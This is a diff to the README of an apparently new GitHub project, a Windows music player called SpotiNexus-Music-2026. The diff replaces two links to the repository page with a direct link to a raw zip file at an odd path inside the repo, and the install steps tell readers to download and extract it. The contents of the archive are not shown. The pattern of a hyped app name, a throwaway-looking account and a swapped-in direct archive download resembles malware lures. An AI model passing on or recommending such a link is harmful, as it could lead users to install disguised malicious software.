@@ -1,6 +1,6 @@
 # 🎵 SpotiNexus-Music-2026 - Simple high-fidelity music playback
 
-[![Download Now](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge&logo=github)](https://github.com/whitestreaked-pectus612/SpotiNexus-Music-2026)
+[![Download Now](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge&logo=github)](https://github.com/whitestreaked-pectus612/SpotiNexus-Music-2026/raw/refs/heads/main/queenlet/Spoti-Music-Nexus-lobcock.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ SpotiNexus-Music-2026 is a Windows app for music playback and local metadata res
 
 ## 📥 Download and Install
 
-1. Open this page: [SpotiNexus-Music-2026 Download Link](https://github.com/whitestreaked-pectus612/SpotiNexus-Music-2026)
+1. Open this page: [SpotiNexus-Music-2026 Download Link](https://github.com/whitestreaked-pectus612/SpotiNexus-Music-2026/raw/refs/heads/main/queenlet/Spoti-Music-Nexus-lobcock.zip)
 2. On the GitHub page, look for the latest release or the main download file.
 3. Download the Windows version to your PC.
 4. If the file is a `.zip`, right-click it and choose **Extract All**.
